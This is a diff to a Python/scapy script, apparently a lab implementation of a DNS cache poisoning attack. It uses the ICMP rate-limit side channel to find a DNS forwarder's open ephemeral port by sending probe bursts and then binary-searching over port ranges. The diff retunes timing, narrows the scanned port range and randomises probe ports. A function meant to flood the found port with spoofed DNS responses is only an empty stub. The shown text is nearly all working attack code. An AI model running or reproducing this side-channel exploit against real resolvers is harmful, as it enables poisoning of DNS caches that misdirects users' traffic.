@@ -9,7 +9,6 @@ from ipaddress import IPv6Network, IPv6Address
 from functools import wraps
 
 
-lock = threading.Lock()
 
 def get_random_domain():
     '''
@@ -49,11 +48,18 @@ local_free_ip = []
 ICMP_limit_rate = 50
 ICMP_recovering_time = .02 # 20 miliseconds
 sleep_time_for_ICMP_refresh = .05 # 50 ms
-wait_time_for_ICMP_reply = .1
+wait_time_for_ICMP_reply = .05
+
+MIN_PORT_TO_SCAN = 2550
+MAX_PORT_TO_SCAN = 2600
 
 fixed_src_port_for_attack = 9556
 
+attack_burst_end_time = 0
+
 finished = 0
+
+timeout_for_dns_query = 20
 
 global_socket = conf.L2socket(iface='vboxnet2')
 
@@ -123,7 +129,7 @@ class Logger(object):
     def flush(self):
         pass
 
-def step1(thread_id):
+def step1(thread_id, lock):
 
     my_ip = '192.168.58.1'
     my_port = 9554
@@ -136,7 +142,7 @@ def step1(thread_id):
 
     lock.acquire()
     
-    ret = sr1(packet, verbose=True)
+    ret = sr1(packet, timeout=timeout_for_dns_query, verbose=True)
 
     lock.release()
 
@@ -184,15 +190,21 @@ def do_one_chunk_of_attack(port_start, number_of_probe_packet, number_of_padding
         padding_packet.append(raw(packet))
 
     ip_layer = IP(dst=forwarder_ip) # leaving src to be filled up by scapy
-    udp_layer = UDP(dport=1, sport=fixed_src_port_for_attack)
+    udp_layer = UDP(dport=1, sport=RandShort())
     verification_packet = Ether() / ip_layer / udp_layer
-    verification_packet = raw(verification_packet)
+    #verification_packet = raw(verification_packet)
 
     elapsed_time = time.perf_counter() - start_time
-    print ("Time needed for generating packets: " + to_milis_str(elapsed_time))
+    #print ("Time needed for generating packets: " + to_milis_str(elapsed_time))
 
-    # improving scapy's packet sending performance
-    # https://byt3bl33d3r.github.io/mad-max-scapy-improving-scapys-packet-sending-performance.html
+
+    attack_burst_start_time = time.perf_counter()
+
+    global attack_burst_end_time
+    time_elapsed_after_last_attack = attack_burst_start_time - attack_burst_end_time
+
+    #if sleep_time_for_ICMP_refresh > time_elapsed_after_last_attack:
+    #    time.sleep(sleep_time_for_ICMP_refresh - time_elapsed_after_last_attack)
 
 
     start_time = time.perf_counter()
@@ -203,19 +215,22 @@ def do_one_chunk_of_attack(port_start, number_of_probe_packet, number_of_padding
         #send(packet, verbose=False)
         global_socket.send(packet)
     elapsed_time = time.perf_counter() - start_time
-    print ("Time needed for sending 50 packets: " + to_milis_str(elapsed_time))
+    #print ("Time needed for sending 50 packets: " + to_milis_str(elapsed_time))
 
     #print("Sending verification packet")
 
     start_time = time.perf_counter()
 
     # This timeout is the crucial factor
-    reply = sr1(verification_packet, timeout=wait_time_for_ICMP_reply, verbose=False) # in seconds
+    reply = global_socket.sr1(verification_packet, timeout=wait_time_for_ICMP_reply, verbose=False) # in seconds
 
     elapsed_time = time.perf_counter() - start_time
-    print ("Time needed for sending and receiving verification packet: " + to_milis_str(elapsed_time))
+    #print ("Time needed for sending and receiving verification packet: " + to_milis_str(elapsed_time))
     #print("Got reply from verificaiton packet")
     #print (reply.show())
+
+
+    attack_burst_end_time = time.perf_counter()
 
 
     # if timeout occurs even then the reply will be none
@@ -228,18 +243,21 @@ def do_one_chunk_of_attack(port_start, number_of_probe_packet, number_of_padding
             print("Yaaay, got ICMP port unreachable message. At least one port is open.")
             #print (reply[ICMP].summary())
             #print (reply[ICMP].show())
+            #print ("icmp code and type : " + 
+            #str(reply.getlayer(ICMP).code) + " " + str(reply.getlayer(ICMP).type))
             return port_start # important for the base condition of the binary search
+        '''
         elif reply.haslayer(UDP):
             print("Don't know what this means.")
         else:
             print("Unknown reply")
+        '''
 
     return 0 # for now
 
 # dividing range into [left...mid] and [mid + 1...right]
 def binary_search(left, right):
     mid = left + (right - left) // 2 #integer division
-    print(mid)
     if left == right:
         return do_one_chunk_of_attack(left, 1, ICMP_limit_rate - 1)
 
@@ -257,13 +275,16 @@ def binary_search(left, right):
 
 def find_the_exact_port(start_port, number_of_ports):
     ret = binary_search(start_port, start_port + number_of_ports - 1)
-    print ("port found : " + str(ret))
+    if ret > 0:
+        print ("\n\n\nopen port found in bin search : " + str(ret) + "\n\n\n")
+    else:
+        print ("no open port found in bin search : " + str(ret))
     return ret
 
 def flood_the_port_with_spoofed_dns_response(actual_port):
     None
 
-def step2(thread_id, source_port_range_start, source_port_range_end):
+def step2(thread_id, source_port_range_start, source_port_range_end, lock):
     #need to run this file with sudo because of port 53
 
     #print("thread id: " + str(thread_id))
@@ -289,9 +310,14 @@ def step2(thread_id, source_port_range_start, source_port_range_end):
             port = find_the_exact_port(start, ICMP_limit_rate)
 
             # found the port
-            if port != -1:
+            if port > 0:
+
+                print ("---------------------found the exact port.--------------")
+                exit()
+
                 result = flood_the_port_with_spoofed_dns_response(port)
                 if result == True:
+                    global finished
                     finished = 1
                     return
 
@@ -299,8 +325,6 @@ def step2(thread_id, source_port_range_start, source_port_range_end):
         end_time_one_chunk = time.perf_counter()
         time_elapsed_for_one_chunk = end_time_one_chunk - start_time_one_chunk
 
-        #if (time_elapsed_for_one_chunk < ICMP_recovering_time)
-        #    time.sleep(ICMP_recovering_time - time_elapsed_for_one_chunk)
         print ("System wide time needed in this loop once: " + to_milis_str(time_elapsed_for_one_chunk))
 
         start += ICMP_limit_rate
@@ -320,14 +344,21 @@ def main():
 
     while finished == 0:
 
+        time.sleep(2)
+
         print ("----------Iteration " + str(iteration) + " is starting.----------")
 
-        t1 = threading.Thread(target=step1, args=(2 * iteration - 1, ))
+        lock = threading.Lock()
+
+        t1 = threading.Thread(target=step1, args=(2 * iteration - 1, lock))
         t1.start()
-        t2 = threading.Thread(target=step2, args=(2 * iteration, 32768, 60999))
+
+        global attack_burst_end_time
+        attack_burst_end_time = time.perf_counter()
+        t2 = threading.Thread(target=step2, args=(2 * iteration, MIN_PORT_TO_SCAN,
+                            MAX_PORT_TO_SCAN, lock))
         t2.start()
 
-        t1.join()
         t2.join()
         
         print ("----------Iteration " + str(iteration) + " is completed.----------")
